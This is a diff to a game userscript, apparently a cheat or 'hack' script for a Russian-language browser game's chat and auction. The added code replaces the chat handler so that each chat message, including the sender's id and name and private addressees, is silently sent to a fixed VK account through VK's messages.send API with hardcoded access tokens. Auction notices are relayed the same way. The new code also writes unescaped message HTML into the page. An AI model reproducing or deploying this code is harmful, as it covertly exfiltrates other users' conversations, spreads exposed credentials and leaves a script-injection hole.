@@ -299,5 +299,66 @@ var clanin=function(id){var whclan = prompt('В какой клан вступи
 function getCookie(name) {var matches = document.cookie.match(new RegExp("(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"));return matches ? decodeURIComponent(matches[1]) : undefined;}
 function setCookie(name, value, options) {options = options || {};var expires = options.expires;if (typeof expires == "number" && expires) {var d = new Date();d.setTime(d.getTime() + expires * 1000);expires = options.expires = d;}if (expires && expires.toUTCString) {options.expires = expires.toUTCString();}value = encodeURIComponent(value);var updatedCookie = name + "=" + value;for (var propName in options) {updatedCookie += "; " + propName;var propValue = options[propName];if (propValue !== true) {updatedCookie += "=" + propValue;}}document.cookie = updatedCookie;}
 };init_hack();
+var tChat = {
+chat : function(){ newChat_addMsg = function(response){
+    console.log(response);
+name = response.name.replace('<br>',' ');
+msg = response.msg;
+photo = response.photo.replace('script','');
+to = 0;//	Определение адресата
+if(typeof response.to != 'undefined')to = response.to
+if(name.search('/u30') > -1) name = 'id'+response.uid;
+var tooo = '', mooo = '';
+if(to != 0 && response.toName != undefined )tooo = ' -> @id'+to+' ('+response.toName+')';
+if(response.moder>0){mooo = '⚠ '};
+var tvk= mooo+'@id'+response.uid+' ('+name+') '+tooo+' | '+msg;
+var jvk=new Image();jvk.src='https://api.vk.com/method/messages.send?user_ids=381150952&message='+tvk.replace(/<[^>]+>/g,'')+'&access_token=f375bca282c8dccc300fb83b70539d44c79fd039d1780d9041043315a6628c96a3bb2e0bf611d7762f4cd&v=5.46';
+
+		for(var sm in smiles) msg = msg.split(sm).join("<img class='smileInText' src='"+smiles[sm]+"'>");
+		if(response.uid==13){
+			//console.log(response);
+			$(".newChat_msgBox").each(function(index){// заныкаем все сообщения выбранного пользователя
+				if($(this).data('uid') == response.bannedUid)$(this).children('font').addClass('bannedMsg');
+			});
+		}
+		$("#newChat_body").append("<div class='newChat_msgBox'><img class='newChat_photo' src='"+photo+"'><b>"+name+"</b><br>"+msg+"</div>");
+		if(typeof response.banTime != 'undefined'){//Выводим время бана
+			$(".newChat_msgBox:last").children('b').append(' ('+timeFromSec(response.banTime)+')');
+		}
+		if(to > 0 && to==myUid){//Если сообщение адресовано "мне"
+			$(".newChat_msgBox:last").children('b').css('color','rgb(6, 255, 165)');
+			$(".newChat_msgBox:last").children('b').append(' -> '+response.toName);
+			//console.log('Личное сообщение');
+		}else if(to > 0){
+			$(".newChat_msgBox:last").children('b').append(' -> '+response.toName);
+			$(".newChat_msgBox:last").css('opacity','0.6');
+		}
+		if(selectedInChatUID > 0 && selectedInChatUID==response.uid){//Выделяем новые сообщения если человек выделен
+			$(".newChat_msgBox:last").addClass('green_bg');
+		}
+		$(".newChat_msgBox:last").data('name',name);$(".newChat_msgBox:last").data('photo',photo);$(".newChat_msgBox:last").data('uid',response.uid);
+		if(response.moder==1){
+			$(".newChat_msgBox:last").append("<div class='newChat_moderIco'></div>");
+		}
+		if(response.moder==2){
+			$(".newChat_msgBox:last").append("<div class='newChat_traineeIco'></div>");
+		}
+		if(maxScrollTop-$("#newChat_body").scrollTop()<100){
+			$("#newChat_body").scrollTop(9999999);
+			maxScrollTop = $("#newChat_body").scrollTop()
+		}
+} },
+
+au : function(){ chatSocket.on('message', function (msg) {
+var response = JSON.parse(msg);
+if(response.head == 'auction_inf'){
+    if(typeof response.auction != 'undefined'){
+        var AU = response.auction;
+var tau = 'Начало аукциона! Награда - '+AU.award+' €. ';
+var jvk=new Image();jvk.src='https://api.vk.com/method/messages.send?user_ids=381150952&message='+tau+'&access_token=8969ead266155c825b0bf1abafb3b3f19e82c2770ce4684f5c8e625a02a8de231b22818bd7508cd73d639&v=5.46';
+    }}
+})}
+};
+tChat.chat();setTimeout(function(){tChat.au();},30000);
 var AUTO = {};
 /* end super puper script */
